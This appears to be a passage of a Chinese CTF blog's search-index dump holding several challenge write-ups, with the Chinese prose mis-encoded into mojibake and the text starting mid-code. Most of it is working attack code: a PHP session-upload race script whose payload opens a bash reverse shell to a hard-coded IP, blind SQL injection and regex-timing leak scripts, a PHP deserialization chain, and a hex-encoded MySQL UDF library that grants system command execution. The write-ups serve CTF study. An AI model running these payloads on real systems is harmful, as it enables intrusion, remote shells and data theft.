0); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($curlobj); if(ord($res) &lt; 0x80){ $dieMess = $res; } $httpCode = curl_getinfo($curlobj, CURLINFO_HTTP_CODE); var_dump($httpCode); if($httpCode &lt; 300){ $down = curl_init($url); $tmpFile = tempnam(sys_get_temp_dir(), 'image'); $resource = fopen($tmpFile, 'wb'); curl_setopt($down, CURLOPT_FILE, $resource); curl_setopt($down, CURLOPT_TIMEOUT, 200); curl_setopt($down, CURLOPT_URL, $url); curl_setopt($down, CURLOPT_HEADER, 0); curl_exec($down); $filename = &quot;./you_will_never_find_me_hiahiahia_and_my_duty_is_storage_tmp_file/&quot; . md5(time()) . &quot;.png&quot;; copy($tmpFile, $filename); @unlink($tmpFile); if($dieMess == &quot;&quot;) $dieMess = &quot;Your picture's colorful number is &quot; . getMainColor($filename, '1') . &quot;.&quot;; @unlink($filename); } else{ $dieMess = &quot;Woops, seem I can not visit it!&quot;; } } else{ $dieMess = &quot;Extension not allowed!&quot;; } }} æ‰€ä»¥åº”è¯¥æ˜¯å°†tmpfileæ–‡ä»¶çš„å†…å®¹èµ‹å€¼ç»™filenameä¸­ï¼Œç„¶åè®¿é—®å³å¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾flagåœ¨å“ªé‡Œï¼Œå¯ä»¥çŒœä¸€ä¸‹æ˜¯å¦åœ¨/flagæˆ–è€…/flag.txt~ 1115æ‰«æä¸€ä¸‹ å‘ç°æœ‰sourceç›®å½• require 'sinatra'require 'base64'require 'safe_regexp'FLAG = File.open('/flag', &quot;r&quot;).read # æ˜¯ä¸€ä¸ªMD5ï¼Œæäº¤æ—¶è¯·åŒ…è£¹ä¸Šflag{}String.class_eval do def text return [self].pack('H*') endendset :public_folder, File.dirname(__FILE__) + '/static'get '/' do File.open('/app/app/index.html' , &quot;r&quot;).readendget '/check/:regex' do begin regexp = Regexp.new(params['regex'].text) p regexp rescue &quot;False!&quot; return end begin SafeRegexp.execute(regexp, :match?, FLAG, timeout: 3) &quot;OK!&quot; rescue &quot;False!&quot; endendget '/source' do File.open(__FILE__ , &quot;r&quot;).readend è¿™é¢˜æ˜¯æ­£åˆ™è¡¨è¾¾å¼å»¶æ—¶ï¼Œç›´æ¥æ‰“å°±è¡Œäº†~ require 'net/http'CHALLENGE = 'http://a.y1ng.vip:1115'String.class_eval do def hex res = '' self.each_byte do |i| res += &quot;%02x&quot; % i end return res endenddef random(len) chars = (&quot;a&quot;..&quot;z&quot;).to_a + (&quot;A&quot;..&quot;Z&quot;).to_a + (&quot;0&quot;..&quot;9&quot;).to_a s = &quot;&quot; 1.upto(len) do s &lt;&lt; chars[rand(chars.size - 1)] end senddef check_result(reg, suffix) full_regexp = &quot;^(?=&quot; + reg + &quot;)((.*)*)*&quot; + suffix p full_regexp uri = URI(CHALLENGE + 'check/' + full_regexp.hex) Net::HTTP.get_response(uri)enddef leak(flag, r) chars = '0123456789abcdef' (0..15).each do |i| if check_result(flag + chars[i], r).body[&quot;False&quot;] p flag + chars[i] return leak(flag + chars[i], r) end endendr = random(10)+'$'leak('', r) 2014ä¸Šé¢å­˜åœ¨æ–‡ä»¶åŒ…å«:ä½¿ç”¨ä¸€ä¸‹æŒ‡ä»¤è¯»å–æºç  ?page=php://filter/convert.iconv.ASCII.UCS-2BE/resource=login.php?page=php://filter/convert.iconv.ASCII.UCS-2BE/resource=index.php å¾—åˆ°ä»¥ä¸‹å†…å®¹: &lt;?php error_reporting(0); if (isset($_GET['d3bug'])) { phpinfo(); } if (isset($_GET['page'])) { $page = $_GET['page']; $filter = &quot;/\\.\\.|base|file|gopher|http|ftp|phar|base|string|data|zip|compress|base|decode|read|pear|rot|crypt|pear|utf|flag/i&quot;; if (preg_match( $filter , $page) ) { die(&quot;hacker&quot;); } include $page; }else{ echo &quot;&lt;script&gt;location.href='./?page=login.php'&lt;/script&gt;&quot;; } ç„¶åçœ‹åˆ°phpinfo()é‡Œé¢ï¼Œå¯ä»¥ä½¿ç”¨sessionæ–‡ä»¶åŒ…å«ï¼Œå› ä¸ºPHP_SESSION_UPLOAD_PROGRESSæ˜¯æœ‰å¼€çš„ import requestsimport threadingsess_id=&quot;tlife&quot;s=requests.session()url=&quot;http://&quot;def session_upload(): while True: res= s.post( url=f&quot;{url}/?page=/tmp/session/sess_{sess_id}&quot;, data={ 'PHP_SESSION_UPLOAD_PROGRESS': &quot;&lt;?=`bash -c 'bash -i &gt;&amp; /dev/tcp/110.42.133.120/9999 0&gt;&amp;1'`;?&gt;&quot; }, files={&quot;file&quot;: ('xxx.txt', open(&quot;shell.txt&quot;, &quot;r&quot;))}, cookies={'PHPSESSID':sess_id} )for i in range(100): thread=threading.Thread(target=session_upload) thread.start() å°±å¯ä»¥äº†~ 1119çœ‹äº†ä¸€ä¸‹è¿‡æ»¤äº†æœ€é‡è¦çš„infoåº“ï¼Œå°±æ„å‘³ç€å¤§æ¦‚ç‡æ˜¯æ— åˆ—åç›²æ³¨äº†ï¼Œç„¶åè¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒç¬¦å·ï¼Œè¿˜æœ‰likeã€rlikeç­‰æ­£åˆ™åŒ¹é…å‡½æ•°ï¼Œé‚£ä¹ˆæœ¬é¢˜ä¼¼ä¹åªèƒ½ç”¨case whenäº†çš„æ„Ÿè§‰æ¥ä¸‹ åˆ¤æ–­æ³¨å…¥ç±»å‹ å¸ƒå°”ç›²æ³¨ï¼Œå›æ˜¾åˆ†ä¸º æµ‹è¯•è¯­å¥ï¼š:root'and/**/case/**/1/**/when/**/1/**/then/**/1/**/else/**/0/**/end#true:welcomt adminfalse:wrong ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š æ„é€ æ³¨å…¥è¯­å¥ è¿™é¢˜çš„æˆªå–å‡½æ•°åŸºæœ¬éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ æ¥ä¸‹æ¥å°±æ˜¯è·‘è¡¨åï¼Œç”±äºinåº“è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œè¯•äº†ä¸€ä¸‹ å‘ç° select group_concat(table_name) from sys.schema_table_statistics; æ˜¯å¯ä»¥çš„ å°±å¯ä»¥è·‘å‡ºè¡¨åäº†æ¥ä¸‹æ¥ä½¿ç”¨unionæ— åˆ—åç›²æ³¨ select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2 å¾—åˆ°è¡¨åä»¥å ç›´æ¥select * from SeCrrreTè·‘ä¸å‡ºæ¥ï¼Œæ‰€ä»¥å¯ä»¥çŒœæƒ³è‚¯å®šä¸æ­¢ä¸€è¡Œï¼Œæ‰€ä»¥åé¢è¦åŠ limit ç„¶åç”¨æ— åˆ—åç›²æ³¨ï¼Œå»å°è¯•å­—æ®µæ•° import requestsimport stringurl=&quot;http://a.y1ng.vip:1119/&quot;s=requests.session()def sql_injection(payload): data1=&quot;&quot; for i in range(1,100): for j in range(32,128): payload_tr=f&quot;root'and case ascii(reverse(left(({payload}),{i}))) when {j} then 1 else 0 end#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ &quot;username&quot;:payload_tr, &quot;password&quot;:&quot;1141&quot; } r=s.post(url=url,data=data).text #print(r) #print(data) if &quot;Welcome Admin!&quot; in r: data1+=chr(j) print(data1) breakif __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctfgame #payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT payload=&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;#flag{fab99a66-23db-47b1-9db4-9262664d76a8} sql_injection(payload)","link":"/2021/08/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"2021å·¥æ§å®‰å…¨çº¿ä¸Šåˆèµ›","text":"é­åˆ°é»‘å®¢æ”»å‡»ï¼æ‰“å¼€wiresharkï¼Œå‘ç°å¼‚å¸¸æ•°æ®å‘ç°æ˜¯è«æ–¯ç”µç ï¼Œè§£ç ä»¥åå°±å¯ä»¥æ‹¿åˆ°flag å·¥æ§åè®®åˆ†æè¿™é¢˜ä¹Ÿæ˜¯èµ›åæ‰åšå‡ºæ¥çš„ï¼Œå’Œ18å¹´çš„é¢˜ç›®å¾ˆåƒï¼Œçœ‹åˆ°æœ‰write varå†™å…¥ï¼Œè®¾ç½®ç­›é€‰æ¡ä»¶ï¼š s7comm&amp;&amp;s7comm.param.func==0x05 ç„¶åæ‹¼å‡‘èµ·æ¥å³å¯","link":"/2021/09/12/2021%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/"},{"title":"buu27","text":"&lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;highlight_file(__FILE__);if($_SESSION['username'] ==='admin'){ $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); }}else{ $_SESSION['username'] ='guest';}$direction = filter_input(INPUT_POST, 'direction');$attr = filter_input(INPUT_POST, 'attr');$dir_path = &quot;/var/babyctf/&quot;.$attr;if($attr===&quot;private&quot;){ $dir_path .= &quot;/&quot;.$_SESSION['username'];}if($direction === &quot;upload&quot;){ try{ if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){ throw new RuntimeException('invalid upload'); } $file_path = $dir_path.&quot;/&quot;.$_FILES['up_file']['name']; $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES['up_file']['tmp_name']); if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){ $upload_result = &quot;uploaded&quot;; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $upload_result = $e-&gt;getMessage(); }} elseif ($direction === &quot;download&quot;) { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.&quot;/&quot;.$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=&quot;'.substr($filename, 0, -65).'&quot;'); if(readfile($file_path)){ $download_result = &quot;downloaded&quot;; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e-&gt;getMessage(); } exit;}?&gt; 1.ä¼ªé€ adminçš„session2.åˆ›å»ºä¸€ä¸ªsuccess.txtä¼ªé€ adminçš„sessionnæ„Ÿè§‰å¯ä»¥å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªï¼Œç„¶åå†ä¼ è¿‡å»ï¼š","link":"/2021/09/07/buu27/"},{"title":"ç¾ŠåŸæ¯wp","text":"Only 4æœ‰ä¸ªå…³é”®æ–‡ä»¶serialize.phpæ–‡ä»¶æ²¡æ‰«åˆ°æ˜¯çœŸçš„æ— è¯­ï¼Œä¸€ç›´åœ¨é‚£é‡Œè¯»æ–‡ä»¶ï¼Œæœ‰ä¸ªé…ç½®æ–‡ä»¶ ?gwht=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini è¯»å®Œä»¥åå‘ç°session_upload_progressé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œè¿˜æé«˜äº†sessionè·¯å¾„ï¼Œæ‰€ä»¥å°±ä½¿ç”¨æ¡ä»¶ç«äº‰å»ä¸Šä¼ äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥ï¼Œæˆ‘è¿™é‡Œä¸€ç›´åå¼¹shellæ²¡æˆåŠŸã€‚ã€‚ã€‚ä½†æ˜¯å­¦é•¿ä»¬æˆåŠŸäº†~ æœ‰ä¸€ä¸ªserialize.phpæ–‡ä»¶ï¼Œé¢„æœŸè§£è¯´æ˜¯æ‰«æå‡ºæ¥çš„ï¼Œè¿™æ³¢æ˜¯çœŸçš„éš¾å—å•Šï¼ŒçœŸçš„æ²¡æ‰«å‡ºæ¥æˆ‘åäº†ï¼Œè¿™æ¬¡å¤ç°å°±å†³å®šå¤ç°ä¸€ä¸‹è¿™ä¸ªé¢„æœŸè§£äº†è¯»ä¸€ä¸‹serialize.phpï¼Œå¯ä»¥ç›´æ¥ &lt;?phpclass start_gg { public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call { public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct { public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func { public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;Ã¥Â­Â—Ã§Â¬Â¦Ã¤Â¸Â²Ã¦Â‹Â¼Ã¦ÂÂ¥&quot;.$this-&gt;mod1; } }class string1 { public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo highlight_file('secret.php'); }}?&gt; æ„é€ é“¾æ¡ &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;Ã¥Â­Â—Ã§Â¬Â¦Ã¤Â¸Â²Ã¦Â‹Â¼Ã¦ÂÂ¥&quot;.$this-&gt;mod1; }}class string1{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo highlight_file('secret.php'); }}$a=new start_gg();$b=new Call();$c=new funct();$d=new func();$e=new string1();$f=new GetFlag();$e-&gt;str1=$f;$d-&gt;mod1=$e;$c-&gt;mod1=$d;$b-&gt;mod1=$c;$a-&gt;mod1=$b;echo urlencode(serialize($a)); ä¹‹åå°±å¯ä»¥çœ‹åˆ°secret.phpçš„æºç ï¼Œï¼Œå‘ç°æ˜¯æœ‰å­—ç¬¦é•¿åº¦é™åˆ¶çš„å†™shellè€ƒç‚¹ï¼Œåé¢è¿˜æ²¡æ¥å¾—åŠåšï¼Œç¯å¢ƒå°±å…³äº†ã€‚ã€‚ã€‚ã€‚æ”¶è—ä¸€ä¸‹åˆ«äººçš„è„šæœ¬ def start_flag(s):global stop_threadswhile True:if stop_threads:breakf = io.BytesIO(b'a' * 1024 * 50)url = 'http://192.168.41.134:8000/?gwht=/var/lib/php5/sess_1&amp;ycb=http://127.0.0.1'headers = {'Cookie': 'PHPSESSID=1', }data = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system('cat/flag');echo 'flag';?&gt;&quot;} # Payloadfiles = {&quot;file&quot;: ('1.txt', f)}rest = s.post(url, headers=headers, data=data, files=files)if 'flag' in r.text:print(rest.text)exit()if __name__ == '__main__':with requests.session() as session:while thread_num:thre = threading.Thread(target=run, args=(s,))thre.start()thread_list.append(thre)for t in thread_list:t.join() EasyCurlè¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹æ²¡è§è¿‡çš„è€ƒç‚¹:udfææƒé¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æ’ä»¶åº“çš„è·¯å¾„: show variables like '%plugin%'; ç„¶åå°†åº“æ–‡ä»¶å¯¼å…¥åˆ°è¯¥ç›®å½•ä¸‹ select unhex('7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D80000000100000003000000000000009016200000000000901600000000000080000000000000000000000000